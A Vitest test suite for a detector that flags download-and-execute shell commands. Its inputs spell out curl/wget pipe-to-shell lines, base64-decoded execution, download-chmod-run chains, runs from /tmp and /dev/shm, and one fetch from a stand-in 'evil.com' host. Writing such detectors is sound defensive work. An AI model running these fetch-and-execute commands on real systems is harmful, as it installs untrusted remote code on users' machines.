import { describe, it, expect } from 'vitest';
import { detectBinaryDownloadExecute } from '../binary-download-execute';

describe('detectBinaryDownloadExecute', () => {
  describe('pipe to shell patterns', () => {
    it('should detect curl | bash', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://example.com/script.sh | bash',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.detector).toBe('binary-download-execute');
      expect(result?.message).toContain('piping to shell');
    });

    it('should detect curl | sh', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://example.com/install.sh | sh',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect wget -O- | bash', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'wget -O- https://example.com/script.sh | bash',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect wget --output-document=- | sh', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'wget --output-document=- https://example.com/install.sh | sh',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl | python', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://example.com/script.py | python',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl | python3', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://example.com/script.py | python3',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl | perl', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://api.example.com/script.pl | perl',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl | ruby', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://example.com/install.rb | ruby',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl with sudo | bash', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://example.com/install.sh | sudo bash',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl | sudo sh', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl -fsSL https://get.example.com | sudo sh',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect base64 encoded execution: curl | base64 -d | bash', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://example.com/encoded.txt | base64 -d | bash',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect wget | base64 -d | sh', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'wget -O- https://example.com/payload | base64 -d | sh',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl with other shells (zsh, fish)', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://example.com/script.sh | zsh',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');

      const result2 = await detectBinaryDownloadExecute({
        command: 'curl https://example.com/script.sh | fish',
      });
      expect(result2).not.toBeNull();
      expect(result2?.severity).toBe('high');
    });
  });

  describe('download + chmod + execute chains', () => {
    it('should detect wget && chmod +x && execute', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'wget https://example.com/malware && chmod +x malware && ./malware',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('making it executable');
    });

    it('should detect curl -o && chmod +x && execute', async () => {
      const result = await detectBinaryDownloadExecute({
        command:
          'curl -o script.sh https://example.com/script.sh && chmod +x script.sh && ./script.sh',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect semicolon-separated chain: wget; chmod; execute', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'wget https://example.com/backdoor; chmod +x backdoor; ./backdoor',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl with --output and execute', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl --output binary https://example.com/file && chmod +x binary && ./binary',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect download to /tmp and execute', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'wget -P /tmp https://example.com/exploit && /tmp/exploit',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('execution from dangerous locations', () => {
    it('should detect bash /tmp/script.sh', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'bash /tmp/downloaded_script.sh',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('temporary/cache directory');
    });

    it('should detect python /tmp/malware.py', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'python /tmp/suspicious.py',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect execution from /dev/shm', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'sh /dev/shm/malicious.sh',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect chmod +x in /tmp', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'chmod +x /tmp/backdoor',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect chmod +x in /dev/shm', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'chmod +x /dev/shm/exploit',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect perl execution from /tmp', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'perl /tmp/script.pl',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect ruby execution from /tmp', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'ruby /tmp/backdoor.rb',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('unsafe install scripts', () => {
    it('should detect curl install.sh | bash', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://example.com/install.sh | bash',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl get.sh | sudo bash', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://example.com/get.sh | sudo bash',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect wget setup.sh | sudo sh', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'wget -O- https://example.com/setup.sh | sudo sh',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl -sSL pattern | sudo bash', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl -sSL https://example.com/install | sudo bash',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl -fsSL pattern | sudo bash', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl -fsSL https://get.example.com | sudo bash',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect bootstrap.sh pattern', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://example.com/bootstrap.sh | sudo bash',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('following redirects to executables', () => {
    it('should detect curl -L | bash', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl -L https://example.com/redirect | bash',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      // This gets caught by pipe-to-shell pattern first
      expect(result?.message).toContain('piping to shell');
    });

    it('should detect curl --location | sh', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl --location https://bit.ly/xyz | sh',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect curl -L | python', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl -L https://short.url/abc | python',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('safe patterns - should NOT trigger', () => {
    it('should allow package manager installs', async () => {
      const safeCommands = [
        'apt install package',
        'apt-get install package',
        'yum install package',
        'dnf install package',
        'pacman -S package',
        'brew install package',
        'npm install package',
        'pip install package',
        'cargo install package',
        'gem install package',
      ];

      for (const command of safeCommands) {
        const result = await detectBinaryDownloadExecute({ command });
        expect(result).toBeNull();
      }
    });

    it('should allow rustup install', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://sh.rustup.rs | sh',
      });
      expect(result).toBeNull();
    });

    it('should allow nvm install', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash',
      });
      expect(result).toBeNull();
    });

    it('should allow Docker install', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://get.docker.com | sh',
      });
      expect(result).toBeNull();
    });

    it('should allow Homebrew install', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh | bash',
      });
      expect(result).toBeNull();
    });

    it('should allow safe curl downloads (no pipe)', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'curl -o file.txt https://example.com/file.txt',
      });
      expect(result).toBeNull();
    });

    it('should allow wget downloads (no pipe)', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'wget https://example.com/file.tar.gz',
      });
      expect(result).toBeNull();
    });

    it('should allow safe chmod without download', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'chmod +x my_script.sh',
      });
      expect(result).toBeNull();
    });

    it('should allow execution of local scripts', async () => {
      const result = await detectBinaryDownloadExecute({
        command: './local_script.sh',
      });
      expect(result).toBeNull();
    });

    it('should allow bash of local files', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'bash my_script.sh',
      });
      expect(result).toBeNull();
    });

    it('should allow python of local files', async () => {
      const result = await detectBinaryDownloadExecute({
        command: 'python3 script.py',
      });
      expect(result).toBeNull();
    });
  });

  describe('configuration options', () => {
    it('should respect disabled config', async () => {
      const result = await detectBinaryDownloadExecute(
        {
          command: 'curl https://example.com/script.sh | bash',
        },
        { enabled: false, severity: 'high' }
      );
      expect(result).toBeNull();
    });

    it('should respect custom severity', async () => {
      const result = await detectBinaryDownloadExecute(
        {
          command: 'curl https://example.com/script.sh | bash',
        },
        { enabled: true, severity: 'medium' }
      );
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('medium');
    });

    it('should allow trusted domains', async () => {
      const result = await detectBinaryDownloadExecute(
        {
          command: 'curl https://trusted.example.com/script.sh | bash',
        },
        { enabled: true, severity: 'high', trustedDomains: ['trusted.example.com'] }
      );
      expect(result).toBeNull();
    });

    it('should detect untrusted domains even with trustedDomains config', async () => {
      const result = await detectBinaryDownloadExecute(
        {
          command: 'curl https://evil.com/script.sh | bash',
        },
        { enabled: true, severity: 'high', trustedDomains: ['trusted.example.com'] }
      );
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });
});
